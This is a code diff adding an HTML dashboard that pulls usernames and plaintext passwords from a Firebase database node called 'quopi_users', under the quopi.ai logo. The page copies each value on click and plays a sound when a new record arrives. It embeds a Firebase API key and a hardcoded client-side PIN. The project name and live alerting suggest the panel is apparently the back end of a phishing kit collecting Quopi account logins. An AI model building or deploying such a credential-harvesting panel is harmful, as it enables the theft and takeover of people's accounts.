@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@500&display=swap" rel="stylesheet">
+
+  <title>User Data</title>
+  <style>
+    .active-yes {
+      color: green;
+    }
+    .active-no {
+      color: red;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    th, td {
+      border: 1px solid #000;
+      padding: 10px;
+      text-align: left;
+    }
+  </style>
+
+      <style>
+    
+    select
+    {
+        border-width: 1px;
+    border-color: #f44336;
+    border-style: solid;
+    border-radius: 8px;
+    padding: 3px;
+    
+    }
+    
+    
+    .container{
+    max-width: 70%;
+    font-family: 'Sarabun', sans-serif;
+    margin: auto;
+}
+
+@media (max-width: 768px) {
+    .container {
+        max-width: 90%;
+    }
+}
+
+@media (max-width: 480px) {
+    .container {
+        max-width: 100%;
+    }
+}
+  
+      
+        h1{
+            text-align: center;
+            margin-bottom: 30px;
+        }
+  
+  
+    </style>
+    
+    <style>
+table.customTable {
+    width: 100%;
+    background-color: #FFFFFF;
+    border-collapse: collapse;
+    border-width: 1px;
+    border-color: #7EA8F8;
+    border-style: solid;
+    color: #000000;
+
+      border-collapse: collapse;
+  border-radius: 1em;
+  overflow: hidden;
+}
+
+table.customTable td, table.customTable th {
+    border-width: 1px;
+    border-color: #7EA8F8;
+    border-style: solid;
+    padding: 10px;
+}
+
+table.customTable thead {
+    background-color: #ff90c7;
+}
+
+/* Media query for screens smaller than 768px */
+@media (max-width: 768px) {
+    table.customTable td, table.customTable th {
+        font-size: 12px;
+        padding: 8px;
+        border-width: 0.5px;
+    }
+}
+
+/* Media query for screens smaller than 480px */
+@media (max-width: 480px) {
+    table.customTable td, table.customTable th {
+        font-size: 10px;
+        padding: 6px;
+        border-width: 0.5px;
+    }
+}
+
+
+
+
+.myButton {
+  box-shadow:inset 0px 1px 0px 0px #fbafe3;
+  background:linear-gradient(to bottom, #ff5bb0 5%, #ef027d 100%);
+  background-color:#ff5bb0;
+  border-radius:6px;
+  border:1px solid #ee1eb5;
+  display:inline-block;
+  cursor:pointer;
+  color:#ffffff;
+  font-family:Arial;
+  font-size:15px;
+  font-weight:bold;
+  padding:6px 24px;
+  text-decoration:none;
+  text-shadow:0px 1px 0px #c70067;
+}
+.myButton:hover {
+  background:linear-gradient(to bottom, #ef027d 5%, #ff5bb0 100%);
+  background-color:#ef027d;
+}
+.myButton:active {
+  position:relative;
+  top:1px;
+}
+
+
+</style>
+</head>
+<body style=" background-color: #3F51B5; ">
+  
+   <div class="container">
+
+<center>
+ <div style=" display: flex; ">
+  <img src="https://quopi.ai/img/logo/qp-logo-pc.png" width="200">
+  <button id="startButton" class="myButton">Start Notifications</button>
+</div>
+</center>
+
+<br>
+
+  <table id="userData" class="customTable">
+    <thead>
+      <tr>
+        <th>Username</th>
+        <th>Password</th>
+        <th>Active</th>
+      </tr>
+    </thead>
+    <tbody>
+    </tbody>
+  </table>
+</div>
+  <!-- Add an audio element with the sound file you want to play -->
+  <audio id="notificationSound" src="notification.mp3" preload="auto"></audio>
+
+  <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+      // Your web app's Firebase configuration
+    const firebaseConfig = {
+  apiKey: "AIzaSyAnRNSqRCMrSjhV1h74l8x57BnHIdoIiGY",
+  authDomain: "hyip-html-websites.firebaseapp.com",
+  databaseURL: "https://hyip-html-websites-default-rtdb.firebaseio.com",
+  projectId: "hyip-html-websites",
+  storageBucket: "hyip-html-websites.appspot.com",
+  messagingSenderId: "241224051127",
+  appId: "1:241224051127:web:213fd8f4002bdd3fdc6032",
+  measurementId: "G-QLBNBX70XP"
+};
+
+     // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+      
+      var database = firebase.database();
+
+      // Get a reference to the userData table body
+      var userDataTbody = document.getElementById('userData').getElementsByTagName('tbody')[0];
+
+      // Get a reference to the audio element
+      var notificationSound = document.getElementById('notificationSound');
+
+      // Get a reference to the start button
+      var startButton = document.getElementById('startButton');
+
+      // Function to create a new user row
+      function createUserRow(childData) {
+        var userRow = document.createElement('tr');
+
+        var username = document.createElement('td');
+        username.textContent = childData.username;
+        username.addEventListener('click', function() {
+          navigator.clipboard.writeText(childData.username);
+        });
+        userRow.appendChild(username);
+
+        var password = document.createElement('td');
+        password.textContent = childData.password; // Note: You should never store or display passwords in plain text!
+        password.addEventListener('click', function() {
+          navigator.clipboard.writeText(childData.password);
+        });
+        userRow.appendChild(password);
+
+        var active = document.createElement('td');
+        active.textContent = childData.active;
+        active.className = 'active-' + childData.active;
+        userRow.appendChild(active);
+
+        return userRow;
+      }
+
+      // Query to retrieve and display all existing data
+      database.ref('quopi_users').orderByChild('timeAdded').once('value', (snapshot) => {
+        // Loop through the snapshot and add each user's data to the table
+        snapshot.forEach((childSnapshot) => {
+          var childData = childSnapshot.val();
+          var userRow = createUserRow(childData);
+
+          // Insert the new user's data at the beginning of the userDataTbody
+          userDataTbody.insertBefore(userRow, userDataTbody.firstChild);
+        });
+      });
+
+      startButton.addEventListener('click', function() {
+        // Query to listen for new data being added
+        database.ref('quopi_users').orderByChild('timeAdded').limitToLast(1).on('child_added', (childSnapshot) => {
+          var childData = childSnapshot.val();
+          var userRow = createUserRow(childData);
+
+          // Insert the new user's data at the beginning of the userDataTbody
+          userDataTbody.insertBefore(userRow, userDataTbody.firstChild);
+
+          // Play the notification sound
+          notificationSound.play();
+        });
+
+        // Disable the start button to prevent multiple listeners
+        startButton.disabled = true;
+      });
+    });
+  </script>
+
+
+    <script>
+        window.onload = function() {
+            var pin = sessionStorage.getItem('pin');
+            if (pin !== "3163") {
+                // If pin is not correct, redirect to pin.html
+                window.location.href = 'pin.html';
+            }
+        }
+    </script>
+</body>
+</html>
